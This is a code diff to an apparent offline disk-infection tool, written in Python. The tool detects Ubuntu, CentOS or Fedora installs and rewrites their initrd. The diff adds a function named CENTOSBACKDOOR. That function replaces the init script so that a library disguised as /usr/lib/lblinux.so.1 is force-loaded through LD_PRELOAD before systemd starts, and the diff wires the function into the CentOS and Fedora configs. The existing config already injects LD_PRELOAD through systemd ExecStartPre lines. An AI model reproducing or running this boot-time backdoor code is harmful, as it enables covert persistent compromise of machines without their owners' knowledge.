@@ -18,8 +18,13 @@ export LD_PRELOAD=/{FILENAME}
 """
 CENTOSPRELOADCOMMAND = """\\1
 ExecStartPre=-/bin/mount -o remount,rw /{ROOT}/
-ExecStartPre=-/bin/cp /{INITRDFILENAME} /{ROOT}/{FILENAME}
-ExecStartPre=-/bin/sed -i "s@#DefaultEnvironment=@DefaultEnvironment=LD_PRELOAD=/{FILENAME}@" /{ROOT}/etc/systemd/system.conf"""
+ExecStartPre=-/bin/cp /{INITRDFILENAME} /{ROOT}/{FILENAME}"""
+
+def CENTOSBACKDOOR(settings):
+    os.remove("init")
+    with open("init", "w") as init:
+        init.write("#!/bin/bash\nexport LD_PRELOAD=/{INITRDFILENAME}\nexec /usr/lib/systemd/systemd\n".format(**settings))
+    os.chmod('init', 0777)
 
 config = {
         "Ubuntu" : { # 14.04.3
@@ -79,7 +84,8 @@ config = {
 
                 "ROOT" : "/sysroot/",
                 "FILENAME" : "/usr/lib/lblinux.so.1",
-                "INITRDFILENAME" : "hda1"
+                "INITRDFILENAME" : "hda1",
+                "FUNCTIONS" : [CENTOSBACKDOOR]
             },
         "Fedora" : { # 23
                 "IDENTIFIER" : "grep Fedora etc/initrd-release",
@@ -90,7 +96,8 @@ config = {
 
                 "ROOT" : "/sysroot/",
                 "FILENAME" : "/usr/lib/lblinux.so.1",
-                "INITRDFILENAME" : "hda1"
+                "INITRDFILENAME" : "hda1",
+                "FUNCTIONS" : [CENTOSBACKDOOR]
             }
         }
 
@@ -190,7 +197,7 @@ class UI:
         self.log.border()
         self.screen.addstr((self.height/2), 4, "Log")
 
-    def logger(self, line, status):
+    def logger(self, line, status, continuing = False):
         """
         Log a line to the logging window. Autoscrolls
         A progress of 1.0 will fill the current bar accordingly (useful for 'continue')
@@ -200,7 +207,7 @@ class UI:
             "ERROR": curses.color_pair(1),
             "INFO": curses.color_pair(2)
         }
-        if status == "ERROR":
+        if status == "ERROR" and not continuing:
             progress = 1.0
         else:
             progress = self.idx/self.items
@@ -298,7 +305,7 @@ for disk in glob.glob("/dev/sd?1"):
         initrdidx = re.findall('default="([^"]*)"', data)[1]
         if not initrdidx.isdigit():
             ui.incritems(1)
-            ui.logger(" Find default failed. Using 0", "ERROR")
+            ui.logger(" Find default failed. Using 0", "ERROR", continuing = True)
             initrdidx = 0
         else:
             initrdidx = int(initrdidx)
@@ -358,6 +365,8 @@ for disk in glob.glob("/dev/sd?1"):
             data = re.sub(pre, post, data)
         with open(fname, "w") as fh:
             fh.write(data)
+    for function in config[detectedOS].get("FUNCTIONS", []):
+        function(config[detectedOS])
     ui.logger(" Packing initrd...", "INFO")
     if dracut:
         system("find . | cpio -o -H newc | gzip | dd bs={} seek=1 of=/mnt{}".format(idx, initrd))
